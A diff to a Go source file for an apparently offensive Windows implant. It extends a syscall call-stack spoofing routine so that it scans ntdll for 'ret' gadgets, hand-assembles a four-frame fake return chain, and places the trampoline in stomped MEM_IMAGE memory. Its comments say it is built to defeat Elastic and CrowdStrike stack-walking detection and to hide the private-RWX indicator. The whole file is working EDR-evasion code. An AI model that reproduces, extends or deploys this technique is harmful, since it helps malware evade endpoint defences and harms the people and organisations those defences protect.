@@ -36,15 +36,17 @@ import (
 // Package-level singletons — initialized exactly once
 
 var (
-	hgOnce       sync.Once
-	hgGadget     uintptr // return address placed on stack — CALL gadget preferred, RET fallback
-	hgTrampoline uintptr // spoof trampoline stub
+	hgOnce        sync.Once
+	hgGadget      uintptr    // return address placed on stack — CALL gadget preferred, RET fallback
+	hgExtraFrames [3]uintptr // additional ntdll ret gadgets pushed below the top frame
+	hgTrampoline  uintptr    // spoof trampoline stub
 )
 
 // initSpoofing initialises the gadget and trampoline on first use.
 // Prefers a CALL gadget (Moonwalk++ style) so the forged return address passes
 // the "byte before is CALL" check that Elastic/CS stack-walking rules enforce.
 // Falls back to a plain RET gadget if no CALL site is found.
+// Also finds 3 extra ntdll ret gadgets for a 4-frame synthetic call chain.
 func initSpoofing() {
 	hgOnce.Do(func() {
 		hgGadget = findCallReturnGadget()
@@ -53,6 +55,12 @@ func initSpoofing() {
 		}
 		if hgGadget == 0 {
 			return
+		}
+		extra := findRetGadgets(3)
+		for i, g := range extra {
+			if i < 3 {
+				hgExtraFrames[i] = g
+			}
 		}
 		hgTrampoline = allocSpoofTrampoline()
 	})
@@ -165,52 +173,153 @@ func findNtdllRetGadget() uintptr {
 	return 0
 }
 
+// findRetGadgets scans ntdll .text for n distinct `ret` (C3) addresses,
+// distributed evenly across the section so they appear to come from different
+// functions. Used to build a multi-frame synthetic call chain.
+func findRetGadgets(n int) []uintptr {
+	if n <= 0 {
+		return nil
+	}
+	base := hgNtdllBase()
+	if base == 0 {
+		return nil
+	}
+	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
+	peBase := base + uintptr(e_lfanew)
+	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
+	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
+	sectionBase := peBase + 24 + uintptr(optHeaderSize)
+	const (
+		sectionHeaderSize  = 40
+		sectionVSizeOffset = 8
+		sectionVAOffset    = 12
+		sectionCharOffset  = 36
+		imageScnMemExecute = 0x20000000
+	)
+	for i := uint16(0); i < numSections; i++ {
+		sh := sectionBase + uintptr(i)*sectionHeaderSize
+		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
+			continue
+		}
+		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
+		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
+		if va == 0 || uintptr(vsz) < uintptr(n)*64 {
+			continue
+		}
+		start := base + uintptr(va)
+		step := uintptr(vsz) / uintptr(n+1)
+		var gadgets []uintptr
+		for j := 1; j <= n; j++ {
+			searchStart := start + uintptr(j)*step
+			limit := searchStart + step
+			if limit > start+uintptr(vsz) {
+				limit = start + uintptr(vsz)
+			}
+			for off := searchStart; off < limit; off++ {
+				if *(*byte)(unsafe.Pointer(off)) == 0xC3 {
+					gadgets = append(gadgets, off)
+					break
+				}
+			}
+		}
+		if len(gadgets) == n {
+			return gadgets
+		}
+	}
+	return nil
+}
+
 // ────────────────────────────────────────────────────────────────────────────
 // Trampoline
 
-// trampolineBytes is the 39-byte x64 stub.
+// buildTrampolineBytes returns x64 machine code for the spoof trampoline.
 //
-// It is called via syscall.SyscallN(hgTrampoline, gadget, hgStub, a0,a1,a2,a3,a4).
-// On entry: rcx=gadget, rdx=hgStub, r8=a0, r9=a1, [rsp+0x28]=a2, [rsp+0x30]=a3, [rsp+0x38]=a4.
+// Called via syscall.SyscallN(hgTrampoline, gadget, hgStub, a0,a1,a2,a3,a4).
+// On entry: rcx=gadget(CALL+5), rdx=hgStub, r8=a0, r9=a1, spilled args at [rsp+0x28..].
 //
-//	48 83 EC 08        sub  rsp, 8           ; make room — also 16-aligns the stack for the JMP target
-//	48 89 0C 24        mov  [rsp], rcx       ; fake return address = ntdll gadget
-//	48 89 D0           mov  rax, rdx         ; rax = hgStub address
-//	4C 89 C1           mov  rcx, r8          ; rcx = a0
-//	4C 89 CA           mov  rdx, r9          ; rdx = a1
-//	4C 8B 44 24 30     mov  r8,  [rsp+0x30]  ; r8  = a2 (was [rsp+0x28], shifted by -8)
-//	4C 8B 4C 24 38     mov  r9,  [rsp+0x38]  ; r9  = a3
-//	4C 8B 54 24 40     mov  r10, [rsp+0x40]  ; r10 = a4 (temp)
-//	4C 89 54 24 28     mov  [rsp+0x28], r10  ; 5th syscall arg slot
-//	FF E0              jmp  rax              ; → hgStub: mov r10,rcx; mov eax,ssn; syscall; ret
+// When extra=[f1,f2,f3] are non-zero, 4 fake frames are pushed (sub rsp,32):
+//   [rsp+0]  = rcx (CALL+5 gadget)        — syscall ret lands here
+//   [rsp+8]  = f1 (ntdll ret gadget)      — f0 ret lands here
+//   [rsp+16] = f2 (ntdll ret gadget)      — f1 ret lands here
+//   [rsp+24] = f3 (ntdll ret gadget)      — f2 ret lands here
+//   [rsp+32] = SyscallN return addr       — f3 ret lands here → back to Go
 //
-// The hgStub's `ret` pops [rsp]=gadget → gadget's own `ret` pops SyscallN's
-// return address, cleanly returning to the Go caller.
-var trampolineBytes = [39]byte{
-	0x48, 0x83, 0xEC, 0x08,                   // sub  rsp, 8
-	0x48, 0x89, 0x0C, 0x24,                   // mov  [rsp], rcx
-	0x48, 0x89, 0xD0,                          // mov  rax, rdx
-	0x4C, 0x89, 0xC1,                          // mov  rcx, r8
-	0x4C, 0x89, 0xCA,                          // mov  rdx, r9
-	0x4C, 0x8B, 0x44, 0x24, 0x30,             // mov  r8,  [rsp+0x30]
-	0x4C, 0x8B, 0x4C, 0x24, 0x38,             // mov  r9,  [rsp+0x38]
-	0x4C, 0x8B, 0x54, 0x24, 0x40,             // mov  r10, [rsp+0x40]
-	0x4C, 0x89, 0x54, 0x24, 0x28,             // mov  [rsp+0x28], r10
-	0xFF, 0xE0,                                // jmp  rax
+// When extra gadgets are unavailable, falls back to the original 1-frame layout
+// (sub rsp,8) so the caller never crashes.
+func buildTrampolineBytes(extra [3]uintptr) []byte {
+	deepOK := extra[0] != 0 && extra[1] != 0 && extra[2] != 0
+
+	emit64 := func(b []byte, v uint64) []byte {
+		return append(b,
+			byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
+			byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56),
+		)
+	}
+
+	var b []byte
+
+	if deepOK {
+		// sub rsp, 32  — 4 frame slots
+		b = append(b, 0x48, 0x83, 0xEC, 0x20)
+
+		// mov rax, f3; mov [rsp+24], rax
+		b = append(b, 0x48, 0xB8)
+		b = emit64(b, uint64(extra[2]))
+		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x18)
+
+		// mov rax, f2; mov [rsp+16], rax
+		b = append(b, 0x48, 0xB8)
+		b = emit64(b, uint64(extra[1]))
+		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x10)
+
+		// mov rax, f1; mov [rsp+8], rax
+		b = append(b, 0x48, 0xB8)
+		b = emit64(b, uint64(extra[0]))
+		b = append(b, 0x48, 0x89, 0x44, 0x24, 0x08)
+
+		// mov [rsp], rcx    — frame0 = CALL+5 gadget
+		b = append(b, 0x48, 0x89, 0x0C, 0x24)
+		// mov rax, rdx      — rax = hgStub
+		b = append(b, 0x48, 0x89, 0xD0)
+		// mov rcx, r8       — rcx = a0
+		b = append(b, 0x4C, 0x89, 0xC1)
+		// mov rdx, r9       — rdx = a1
+		b = append(b, 0x4C, 0x89, 0xCA)
+		// NT spill args shifted by 0x20 due to sub rsp,32:
+		// orig [rsp+0x28] → [rsp+0x48]; orig [rsp+0x30] → [rsp+0x50]; orig [rsp+0x38] → [rsp+0x58]
+		b = append(b, 0x4C, 0x8B, 0x44, 0x24, 0x48) // mov r8,  [rsp+0x48]  a2
+		b = append(b, 0x4C, 0x8B, 0x4C, 0x24, 0x50) // mov r9,  [rsp+0x50]  a3
+		b = append(b, 0x4C, 0x8B, 0x54, 0x24, 0x58) // mov r10, [rsp+0x58]  a4
+		b = append(b, 0x4C, 0x89, 0x54, 0x24, 0x28) // mov [rsp+0x28], r10  5th arg slot
+	} else {
+		// 1-frame fallback (original layout)
+		b = append(b, 0x48, 0x83, 0xEC, 0x08) // sub rsp, 8
+		b = append(b, 0x48, 0x89, 0x0C, 0x24) // mov [rsp], rcx
+		b = append(b, 0x48, 0x89, 0xD0)       // mov rax, rdx
+		b = append(b, 0x4C, 0x89, 0xC1)       // mov rcx, r8
+		b = append(b, 0x4C, 0x89, 0xCA)       // mov rdx, r9
+		b = append(b, 0x4C, 0x8B, 0x44, 0x24, 0x30) // mov r8,  [rsp+0x30]
+		b = append(b, 0x4C, 0x8B, 0x4C, 0x24, 0x38) // mov r9,  [rsp+0x38]
+		b = append(b, 0x4C, 0x8B, 0x54, 0x24, 0x40) // mov r10, [rsp+0x40]
+		b = append(b, 0x4C, 0x89, 0x54, 0x24, 0x28) // mov [rsp+0x28], r10
+	}
+
+	b = append(b, 0xFF, 0xE0) // jmp rax → hgStub → syscall → ret chain
+	return b
 }
 
-// allocSpoofTrampoline copies trampolineBytes into executable memory.
-// Uses stompAlloc (MEM_IMAGE) when available so the trampoline pages show
-// Type=MEM_IMAGE rather than the private-RWX IOC.
+// allocSpoofTrampoline writes the trampoline into executable MEM_IMAGE memory.
+// Uses the deep 4-frame variant when extra ntdll gadgets are available,
+// falling back to the original 1-frame layout otherwise.
 func allocSpoofTrampoline() uintptr {
-	addr := hgAlloc(uint32(len(trampolineBytes)))
+	tb := buildTrampolineBytes(hgExtraFrames)
+	addr := hgAlloc(uint32(len(tb)))
 	if addr == 0 {
 		return 0
 	}
-	dst := (*[len(trampolineBytes)]byte)(unsafe.Pointer(addr))
-	*dst = trampolineBytes
-	// Flip RWX → RX once written; stomped pages no longer appear private-RWX.
-	stompFinalize(addr, uint32(len(trampolineBytes)))
+	dst := (*[256]byte)(unsafe.Pointer(addr))
+	copy(dst[:len(tb)], tb)
+	stompFinalize(addr, uint32(len(tb)))
 	return addr
 }
 
